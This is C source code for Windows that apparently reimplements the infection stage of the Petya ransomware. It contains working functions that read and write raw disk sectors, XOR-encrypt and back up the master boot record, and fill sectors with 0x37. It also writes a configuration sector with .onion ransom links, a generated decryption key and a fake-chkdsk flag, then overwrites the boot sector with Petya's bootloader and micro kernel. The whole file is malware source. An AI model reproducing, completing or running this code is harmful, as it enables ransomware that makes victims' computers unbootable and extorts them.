#include <Windows.h>
#include "misc.h"

#pragma section(".xxxx", execute, read, write)
#pragma code_seg(".xxxx")

BOOL
PetyaReadSector(
	HANDLE hHandle,
	INT iSectorCount,
	CHAR* cBuffer
)
{
	DWORD lpTemporary;
	if ( SetFilePointer( hHandle, iSectorCount * 512, 0, FILE_BEGIN ) == INVALID_SET_FILE_POINTER )
		return FALSE;

	if ( !ReadFile( hHandle, cBuffer, 512, &lpTemporary, 0 ) )
		return FALSE;

	return TRUE;
}

BOOL
PetyaWriteSector(
	HANDLE hHandle,
	INT iSectorCount,
	CHAR* cBuffer,
	DWORD nBytesToWrite //Should be 512
)
{
	DWORD lpTemporary;
	if ( SetFilePointer( hHandle, iSectorCount * 512, 0, FILE_BEGIN ) == INVALID_SET_FILE_POINTER )
		return FALSE;

	if ( !WriteFile( hHandle, cBuffer, nBytesToWrite, &lpTemporary, 0 ) )
		return FALSE;

	return TRUE;
}



PCHAR
PetyaXor(
	PCHAR pcData,
	CHAR cKey,
	INT iLenght
)
{
	CHAR* Output = ( CHAR* )VirtualAlloc( 0, sizeof( CHAR ) * iLenght,
										  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

	for ( INT i = 0; i < iLenght; ++i )
		Output[ i ] = pcData[ i ] ^ cKey;

	return Output;
}


VOID
PetyaBackupMBR(

)
{
	PCHAR BootSector = ( PCHAR )VirtualAlloc( 0, 512, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	DWORD lpTemporary = 0;

	PetyaReadSector( hHard, 0, BootSector );


	PCHAR EncryptedBootSector = ( PCHAR )VirtualAlloc( 0, 512, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	EncryptedBootSector = PetyaXor( BootSector, 0x37, 512 );//Xor the dawg

	PetyaWriteSector( hHard, 56, EncryptedBootSector, 512 );//Set the new encrypted (xored 0x37)
														   //MBR to sect 56 as backup

	VirtualFree( EncryptedBootSector, 512, MEM_RELEASE );
	VirtualFree( BootSector, 512, MEM_RELEASE );
}

VOID
PetyaFillEmptySectors(

)
{
	//Fill with 0x37 all empty sectors
	///////////////////////////////////////////////////////////////////////////////////////////////////////////
	DWORD lpTemporary = 0;

	BYTE Fill37[ 512 ];
	for ( INT i = 0; i < 512; i++ )
		Fill37[ i ] = 0x37;
	//RtlFillMemory( Fill37, 512, 0x37 );

	for ( INT i = 1; i < 33; ++i ) //fill 0x37 all the empty sectors
		PetyaWriteSector( hHard, i, Fill37, 512 );

	PetyaWriteSector( hHard, 55, Fill37, 512 );//Verification sector
}

//////////////////////////////////////
////////////////// CONFIG SECTOR
BOOLEAN encode( char* key, BYTE* encoded )
{
	if ( !key || !encoded )
	{
		MessageBox( 0, "Invalid buffer", "Error", 0 );
		//printf( "Invalid buffer\n" );
		return FALSE;
	}
	size_t len = strlen( key );
	if ( len < 16 )
	{
		MessageBox( 0, "Invalid key", "Error", 0 );
		//printf( "Invalid key\n" );
		return FALSE;
	}
	if ( len > 16 ) len = 16;

	int i, j;
	i = j = 0;
	for ( i = 0, j = 0; i < len; i++, j += 2 )
	{
		char k = key[ i ];

		encoded[ j ] = k + 'z';
		encoded[ j + 1 ] = k * 2;
	}
	encoded[ j ] = 0;
	encoded[ j + 1 ] = 0;
	return TRUE;
}


CHAR kPetyaCharset[ ] = "123456789abcdefghijkmnopqrstuvwxABCDEFGHJKLMNPQRSTUVWX";


HCRYPTPROV prov;

INT
random( 

)
{
	if ( prov == NULL )
		if ( !CryptAcquireContext( &prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT ) )
			ExitProcess( 1 );

	int out;
	CryptGenRandom( prov, sizeof( out ), ( BYTE* )( &out ) );
	return out & 0x7fffffff;
}

VOID
GenerateRandomKey(
	CHAR* generate
)
{
	for ( int i = 0; i < 16; i++ )
		generate[ i ] = kPetyaCharset[ random( ) % strlen( kPetyaCharset ) ];
	generate[ 16 ] = 0;
}


VOID
PetyaConfigurationSector(

)
{

	//Configure Sector 54
	///////////////////////////////////////////////////////////////////////////////////////////////////////////
	DWORD lpTemporary = 0;

	PetyaSectorData* Dawger = ( PetyaSectorData* )VirtualAlloc( 0, sizeof( PetyaSectorData ),
																MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );


	//Really unoptimized but whatever the fuck.
	PCHAR FirstLink = ( PCHAR )VirtualAlloc( 0, sizeof( Dawger->FirstLink ), // this should use strlen smh
												MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	PCHAR SecondLink = ( PCHAR )VirtualAlloc( 0, sizeof( Dawger->SecondLink ),
												MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	PCHAR PersonalDecryptionCode = ( PCHAR )VirtualAlloc( 0, sizeof( Dawger->PersonalDecryptionCode ),
												MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	FirstLink = "http://petyaxxxxxxxxxxx.onion/xxxxxx";
	SecondLink = "http://petyaxxxxxxxxxxx.onion/xxxxxx";
	PersonalDecryptionCode = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

	Dawger->Encrypted = 0x00; //Enable fake chkdsk

	Dawger->Reserved[ 0 ] = 0x0d; //New line alligment or something
	Dawger->Reserved[ 1 ] = 0x0a;
	Dawger->Reserved[ 2 ] = 0x20;
	Dawger->Reserved[ 3 ] = 0x20;
	Dawger->Reserved[ 4 ] = 0x20;
	Dawger->Reserved[ 5 ] = 0x20;


	HCRYPTPROV hProvider = 0;

	if ( !CryptAcquireContextW( &hProvider, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT ) )
		return;

	BYTE InitializationVector[ 8 ];
	CHAR EncryptedKey[ 16 ];
	if ( !CryptGenRandom( hProvider, 8, InitializationVector ) )
		CryptReleaseContext( hProvider, 0 );

	RtlCopyMemory( &Dawger->IV, InitializationVector, sizeof( Dawger->IV ) );

	GenerateRandomKey( EncryptedKey );
	MessageBox( 0, EncryptedKey, "Decryption key",0 );
	BYTE EncodedKey[ 32 ];
	encode( EncryptedKey, EncodedKey );//32 bytes key
	RtlCopyMemory( &Dawger->DecryptionKey, EncodedKey, sizeof( Dawger->DecryptionKey ) );

	RtlCopyMemory( &Dawger->FirstLink, FirstLink, sizeof( Dawger->FirstLink ) );
	RtlCopyMemory( &Dawger->SecondLink, SecondLink, sizeof( Dawger->SecondLink ) );
	RtlCopyMemory( &Dawger->PersonalDecryptionCode, PersonalDecryptionCode, sizeof( Dawger->PersonalDecryptionCode ) );


	PCHAR WriteWith = ( PCHAR )Dawger; //Cast the drill
	PetyaWriteSector( hHard, 54, WriteWith, 512); //Set the configuration


	//this really hurts my brain whatever
	VirtualFree( FirstLink, sizeof( FirstLink ), MEM_RELEASE ); //should've been freed with strlen
	VirtualFree( SecondLink, sizeof( SecondLink ), MEM_RELEASE );
	VirtualFree( PersonalDecryptionCode, sizeof( PersonalDecryptionCode ), MEM_RELEASE );

	VirtualFree( Dawger, sizeof( Dawger ), MEM_RELEASE );


}

#include "ring0.h"

VOID
PetyaInsertMicroKernel(

)
{
	BYTE PartitionTable[ 512 ];
	PetyaReadSector( hHard, 0, PartitionTable );
	for ( INT i = 446; i < 512; ++i )
		Bootloader[ i ] = PartitionTable[ i ];
	//RtlCopyMemory( Bootloader + 446, PartitionTable + 446, 64 );

	//Write Petya's Bootloader
	PetyaWriteSector( hHard, 0, Bootloader, 512 );
	//Only 446 because Petya requires our Partition Table for the $MFT Encryption

	//Write Petya's Micro Kernel
	PetyaWriteSector( hHard, MicroKernelStartingSector,
					  MicroKernel, MicroKernelSectorLenght * 512 );

}
